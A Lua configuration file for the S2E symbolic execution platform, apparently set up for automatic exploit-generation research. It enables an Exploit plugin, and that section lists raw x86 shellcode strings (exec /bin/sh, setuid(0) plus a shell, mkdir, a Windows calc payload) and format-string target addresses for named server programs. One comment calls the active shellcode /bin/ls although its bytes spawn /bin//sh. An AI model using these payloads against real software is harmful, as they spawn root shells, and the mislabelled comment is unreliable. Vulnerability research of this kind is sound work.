-- File: config.lua
s2e = {
  kleeArgs = {
    -- Run each state for at least 1 second before
    -- switching to the other:
    "--use-batching-search=true",
    "--batch-time=3.0",
--    "--use-dfs-search",
--    "--use-query-pc-log",
--    "--use-query-log",
--    "--use-stp-query-pc-log",
--    "--use-forked-stp",
--    "-max-stp-time=5.0",
    "--fork-on-symbolic-address=true",
    "--print-mode-switch=false",
    --"--keep-llvm-functions=true",
    "--concolic-mode=true"
  }
}
plugins = {
  -- Enable a plugin that handles S2E custom opcode
  "BaseInstructions",
--  "ExecutionTracer",
--  "TestCaseGenerator",
--  "HostFiles",
--  "ModuleExecutionDetector",
--  "InstructionCounter",
  --"ModuleExecutionDetector",
  --"FunctionMonitor",
--  "ModuleTracer",
  --"Example",
  --"RawMonitor",
  --"ModuleExecutionDetector",
  --"MemoryChecker",
  "Exploit",
  --"Debugger"
--  "WindowsMonitor"
}


pluginsConfig = {
  HostFiles = {
    baseDir="/home/mhhuang/S2EImage" 
  },

  BaseInstructions = {
    SymbolicOffset = 30,
    SymbolicSize = 1,
    SymbolicJmpOffset = 0,
    SymbolicJmpSize = 0,
    SymbolicEIPOffset = 0,
    SymbolicEIPSize = 0 
    --exclude={};
  },

  Exploit = {
    Type = 1, --(1):return to stack, (2):return to libc, (3):jmp to esp
--    Shellcode = "\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80", --jmp 10; exec(/bin/sh) (heap overflow)
--                                         n   /   s   h       /   /   b   i
    Shellcode = "\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80", --exec(/bin/ls)
--    Shellcode = "\x31\xc9\x51\x68\x63\x61\x6c\x63\x54\xb8\xad\x23\x86\x7c\xff\xd0", -- Windows SP3 Chinese
--    Shellcode = "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80", --setuid(0); execve("/bin/sh",0,0);
--    Shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80", -- setuid(0); exec(/bin/sh)
    --Shellcode = "\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23",
--    Shellcode = "\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23", -- mkdir hacked
    --Shellcode = "/bin/sh",
--    Shellcode = "\x31\xc0\x40\x89\xc3\xcd\x80", -- exit(1)
--    FmtTargetAddress = "0x0806e330"    -- socat
    FmtTargetAddress = "0x0804f108"    -- tipxd
--    FmtTargetAddress = "0x0804ea04"    -- orzhttpd
  },

  RawMonitor = {
    kernelStart = 0xc0000000,
    myprog_id = {
      delay = true,
      name = "a.out",
      start = 0x0,
      size = 52505,
      nativebase = 0x8048000,
      kernelmode = false
    }
  },
  
  ModuleExecutionDetector = {
    myprog_id = {
      moduleName = "a.out",
      kernelMode = false
    }
  },

  WindowsMonitor = {
    version="SP2",
    userMode=true,
    kernelMode=false,
    monitorModuleLoad=true,
    monitorModuleUnload=true,
    monitorProcessUnload=true
  }

  --MemoryChecker = {
  --  checkMemoryErrors=true,
  --  checkMemoryLeaks=true,
  --  terminateOnErrors=true,
  --  terminateOnLeaks=true,
  --}
  --Debugger = {
    --monitorStack=true,
  --}
}
--pluginsconfig['HostFiles'] = {

  --pluginsConfig['HostFiles'].baseDir ={ "/home/bobo/s2e/data"}
  --HostFiles = {
  --  baseDir = "/home/bobo/s2e/data"
  --}

--}

